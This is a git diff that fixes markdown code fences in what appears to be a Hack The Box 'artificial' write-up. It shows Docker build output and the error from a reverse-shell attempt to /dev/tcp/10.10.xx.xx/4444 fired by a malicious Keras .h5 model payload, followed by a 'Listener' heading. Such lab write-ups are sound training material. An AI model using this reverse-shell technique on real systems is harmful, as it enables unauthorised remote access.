@@ -67,7 +67,8 @@ Make sure to replace it with your settings though, like your IPv4 address and po
 ## Getting our payload to work
 I couldn't get it to work on the python3 virtual environment with the requirements.txt file, instead I used `Docker` for it and it worked!
 ### Configuring docker
-```root@zack:~/htb/artificial# docker build . -t artificial
+```
+root@zack:~/htb/artificial# docker build . -t artificial
 [+] Building 1.8s (8/8) FINISHED                                                                       docker:default
  => [internal] load build definition from Dockerfile                                                             0.1s 
  => => transferring dockerfile: 496B                                                                             0.0s
@@ -99,7 +100,7 @@ bash: connect: Connection refused
 bash: line 1: /dev/tcp/10.10.xx.xx/4444: Connection refused
 /usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.
   saving_api.save_model(
-  ```
+```
 Which is fine, since the `.h5` file still got generated
 
 ## Listener
